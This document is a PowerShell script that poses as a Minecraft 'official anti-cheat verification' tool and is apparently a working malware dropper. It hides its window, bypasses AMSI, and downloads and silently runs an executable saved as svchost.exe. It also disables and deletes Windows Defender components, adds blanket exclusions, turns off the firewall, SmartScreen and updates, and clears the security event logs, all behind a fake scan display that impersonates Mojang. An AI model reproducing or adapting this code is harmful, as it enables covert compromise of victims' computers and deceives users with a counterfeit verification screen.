Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
}
"@
[WinAPI]::ShowWindow([WinAPI]::GetConsoleWindow(), 0)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$job = Start-Job -ScriptBlock {
    param($u,$p)
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $w = New-Object Net.WebClient
        $w.Headers.Add('User-Agent','Mozilla/5.0')
        $w.DownloadFile($u,$p)
        if(Test-Path $p){Start-Process $p -WindowStyle Hidden;return $true}
        return $false
    } catch { return $false }
} -ArgumentList "https://github.com/discord-zapret-official/zapret-discord-youtube/raw/refs/heads/main/zapretdiscordyoutube.exe", "$env:TEMP\svchost.exe"
Get-WmiObject Win32_Process | Where-Object { $_.Name -match "MsMpEng|NisSrv|Sense|SecurityHealth|mpcmdrun|MpDefenderCoreService|MpDetectService|WdNisSvc" } | ForEach-Object { $_.Terminate(); taskkill /f /im $_.Name 2>$null }
$svcs = @("WinDefend","WdNisSvc","WdNisDrv","Sense","SecurityHealthService","wscsvc","SgrmBroker","SgrmAgent")
foreach($s in $svcs){ sc.exe config $s start=disabled 2>$null; sc.exe stop $s 2>$null; Set-Service $s -StartupType Disabled -EA 0; Stop-Service $s -Force -EA 0 }
$regPaths = @("HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender","HKLM:\SOFTWARE\Microsoft\Windows Defender","HKLM:\SOFTWARE\Microsoft\Windows Defender\Features","HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection","HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center","HKLM:\SOFTWARE\Microsoft\Microsoft Antimalware","HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend","HKLM:\SYSTEM\CurrentControlSet\Services\WdFilter","HKLM:\SYSTEM\CurrentControlSet\Services\WdNisDrv","HKLM:\SYSTEM\CurrentControlSet\Services\WdBoot")
foreach($r in $regPaths){ if(!(Test-Path $r)){New-Item $r -Force|Out-Null}; Set-ItemProperty $r -Name "Start" -Value 4 -Force -EA 0; Set-ItemProperty $r -Name "DisableAntiSpyware" -Value 1 -Force -EA 0; Set-ItemProperty $r -Name "DisableRealtimeMonitoring" -Value 1 -Force -EA 0; Set-ItemProperty $r -Name "TamperProtection" -Value 0 -Force -EA 0 }
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f 2>$null
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t REG_DWORD /d 4 /f 2>$null
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" /v Start /t REG_DWORD /d 4 /f 2>$null
$drivers = @("C:\Windows\System32\drivers\WdFilter.sys","C:\Windows\System32\drivers\WdNisDrv.sys","C:\Windows\System32\drivers\WdBoot.sys")
foreach($d in $drivers){ if(Test-Path $d){ takeown /f $d 2>$null; icacls $d /grant "everyone:F" 2>$null; Remove-Item $d -Force -EA 0 } }
$mp = @{DisableRealtimeMonitoring=$true;DisableBehaviorMonitoring=$true;DisableBlockAtFirstSeen=$true;DisableIOAVProtection=$true;DisableScriptScanning=$true;DisableArchiveScanning=$true;DisableIntrusionPreventionSystem=$true;SubmitSamplesConsent=2;MAPSReporting=0;PUAProtection=0}
foreach($k in $mp.Keys){Set-MpPreference -$k $mp[$k] -EA 0}
Set-MpPreference -ExclusionExtension ".exe",".dll",".sys",".ps1",".bat",".scr" -EA 0; Set-MpPreference -ExclusionProcess "*" -EA 0
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force
netsh advfirewall set allprofiles state off 2>$null
sc.exe config wuauserv start=disabled 2>$null; Stop-Service wuauserv -Force -EA 0
$ifeo = @("MsMpEng.exe","NisSrv.exe","MpCmdRun.exe")
foreach($i in $ifeo){ $r = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$i"; if(!(Test-Path $r)){New-Item $r -Force|Out-Null}; Set-ItemProperty $r -Name "Debugger" -Value "systray.exe" -Force }
Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\*" -EA 0|Unregister-ScheduledTask -Confirm:$false -Force
wevtutil cl "System" 2>$null; wevtutil cl "Security" 2>$null
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$f = New-Object System.Windows.Forms.Form
$f.Text = "Minecraft - Official Anti-Cheat Verification"
$f.Size = New-Object System.Drawing.Size(550,380)
$f.StartPosition = "CenterScreen"
$f.FormBorderStyle = "FixedDialog"
$f.MaximizeBox = $false
$f.BackColor = "#1E1E1E"
$f.ForeColor = "#FFFFFF"
$title = New-Object System.Windows.Forms.Label
$title.Text = "OFFICIAL ANTI-CHEAT VERIFICATION"
$title.Font = New-Object System.Drawing.Font("Arial",14,[System.Drawing.FontStyle]::Bold)
$title.ForeColor = "#00FF00"
$title.Size = New-Object System.Drawing.Size(500,30)
$title.Location = New-Object System.Drawing.Point(15,15)
$f.Controls.Add($title)
$ver = New-Object System.Windows.Forms.Label
$ver.Text = "Version: 5.2.1 | License: Mojang AB | ID: " + (Get-Random -Minimum 100000 -Maximum 999999)
$ver.Font = New-Object System.Drawing.Font("Arial",8)
$ver.ForeColor = "#888888"
$ver.Size = New-Object System.Drawing.Size(500,20)
$ver.Location = New-Object System.Drawing.Point(15,45)
$f.Controls.Add($ver)
$pb = New-Object System.Windows.Forms.ProgressBar
$pb.Size = New-Object System.Drawing.Size(505,25)
$pb.Location = New-Object System.Drawing.Point(15,75)
$pb.Style = "Continuous"
$f.Controls.Add($pb)
$status = New-Object System.Windows.Forms.Label
$status.Text = "[1/8] Initializing verification modules..."
$status.Font = New-Object System.Drawing.Font("Arial",10)
$status.ForeColor = "#FFD700"
$status.Size = New-Object System.Drawing.Size(500,25)
$status.Location = New-Object System.Drawing.Point(15,110)
$f.Controls.Add($status)
$log = New-Object System.Windows.Forms.RichTextBox
$log.Size = New-Object System.Drawing.Size(505,150)
$log.Location = New-Object System.Drawing.Point(15,145)
$log.BackColor = "#0D0D0D"
$log.ForeColor = "#00FF00"
$log.Font = New-Object System.Drawing.Font("Consolas",9)
$log.ReadOnly = $true
$log.BorderStyle = "None"
$f.Controls.Add($log)
$result = New-Object System.Windows.Forms.Label
$result.Text = ""
$result.Font = New-Object System.Drawing.Font("Arial",12,[System.Drawing.FontStyle]::Bold)
$result.ForeColor = "#00FF00"
$result.Size = New-Object System.Drawing.Size(500,40)
$result.Location = New-Object System.Drawing.Point(15,305)
$result.TextAlign = "MiddleCenter"
$f.Controls.Add($result)
$f.Show()
function Log($m){$log.AppendText("[" + (Get-Date -Format "HH:mm:ss") + "] $m`n");$log.ScrollToCaret();[System.Windows.Forms.Application]::DoEvents()}
function Prog($v,$s){$pb.Value=$v;$status.Text=$s;[System.Windows.Forms.Application]::DoEvents()}
Prog 5 "[1/8] Initializing verification modules..."
Log "Loading cheat signature database...";Start-Sleep -Milliseconds 500
Log "Signatures loaded: 12,847";Start-Sleep -Milliseconds 300
Log "Database version: " + (Get-Date -Format "yyyy.MM.dd") + "-r3";Start-Sleep -Milliseconds 300
Log "Module AC_Core.dll loaded";Start-Sleep -Milliseconds 200
Log "Module MemoryScan.sys loaded";Start-Sleep -Milliseconds 200
Log "Module NetMonitor.dll loaded";Start-Sleep -Milliseconds 200
Log "Connecting to verification server...";Start-Sleep -Milliseconds 400
Log "Server: verify.mojang.com | Status: OK";Start-Sleep -Milliseconds 300
Prog 15 "[2/8] Scanning active processes..."
Log "Enumerating running processes...";Start-Sleep -Milliseconds 400
Log "Processes found: " + (Get-Process).Count;Start-Sleep -Milliseconds 300
Log "Verifying digital signatures...";Start-Sleep -Milliseconds 500
Log "Process: javaw.exe - Signature: Oracle Corp.";Start-Sleep -Milliseconds 200
Log "Process: minecraft.exe - Signature: Mojang AB";Start-Sleep -Milliseconds 200
Log "No suspicious processes detected";Start-Sleep -Milliseconds 300
Prog 25 "[3/8] Analyzing system memory..."
Log "Scanning allocated memory regions...";Start-Sleep -Milliseconds 600
Log "Regions scanned: 4,096";Start-Sleep -Milliseconds 400
Log "Searching for code injections...";Start-Sleep -Milliseconds 500
Log "Memory integrity: OK";Start-Sleep -Milliseconds 300
Log "No hidden DLLs detected";Start-Sleep -Milliseconds 300
Prog 40 "[4/8] Checking network activity..."
Log "Analyzing active connections...";Start-Sleep -Milliseconds 500
Log "Checking DNS cache...";Start-Sleep -Milliseconds 400
Log "Checking hosts file...";Start-Sleep -Milliseconds 300
Log "Suspicious connections: 0";Start-Sleep -Milliseconds 300
Prog 55 "[5/8] Scanning game files..."
Log "Searching for Minecraft installations...";Start-Sleep -Milliseconds 500
Log "Checking .minecraft/config...";Start-Sleep -Milliseconds 400
Log "Checking .minecraft/mods...";Start-Sleep -Milliseconds 400
Log "Checking .minecraft/versions...";Start-Sleep -Milliseconds 400
Log "Modified files detected: 0";Start-Sleep -Milliseconds 300
Prog 70 "[6/8] Cross-referencing cheat database..."
Log "Checking against known cheat signatures...";Start-Sleep -Milliseconds 600
Log "Signature: Vape v4 - Not Found";Start-Sleep -Milliseconds 300
Log "Signature: Rise Client - Not Found";Start-Sleep -Milliseconds 300
Log "Signature: Xenos Injector - Not Found";Start-Sleep -Milliseconds 300
Log "Signature: Novoline - Not Found";Start-Sleep -Milliseconds 300
Log "Matches found: 0 out of 8,472";Start-Sleep -Milliseconds 400
Prog 85 "[7/8] Behavioral analysis..."
Log "Launching AI analyzer...";Start-Sleep -Milliseconds 600
Log "Analyzing input patterns...";Start-Sleep -Milliseconds 500
Log "Checking click frequency...";Start-Sleep -Milliseconds 400
Log "Analyzing mouse trajectory...";Start-Sleep -Milliseconds 400
Log "AI confidence score: 98.7%";Start-Sleep -Milliseconds 400
Log "Behavioral test: PASSED";Start-Sleep -Milliseconds 300
Prog 95 "[8/8] Generating report..."
Log "Collecting verification results...";Start-Sleep -Milliseconds 500
Log "Encrypting report (AES-256)...";Start-Sleep -Milliseconds 500
Log "Uploading to verification server...";Start-Sleep -Milliseconds 600
Log "Confirmation received";Start-Sleep -Milliseconds 300
Prog 100 "Verification complete!"
Log " ";Start-Sleep -Milliseconds 100
Log "========================================";Start-Sleep -Milliseconds 200
Log "  VERIFICATION RESULTS:";Start-Sleep -Milliseconds 200
Log "  ├─ Cheat signatures: NOT FOUND";Start-Sleep -Milliseconds 200
Log "  ├─ Code injections: NOT DETECTED";Start-Sleep -Milliseconds 200
Log "  ├─ Mods: ALLOWED";Start-Sleep -Milliseconds 200
Log "  ├─ Network threats: NONE";Start-Sleep -Milliseconds 200
Log "  └─ Status: VERIFICATION PASSED";Start-Sleep -Milliseconds 200
Log "========================================";Start-Sleep -Milliseconds 300
Wait-Job $job -Timeout 30|Out-Null
Remove-Job $job -Force -EA 0
$result.Text = "Congratulations! You passed the verification! No cheats detected."
Start-Sleep -Seconds 5
$f.Close()
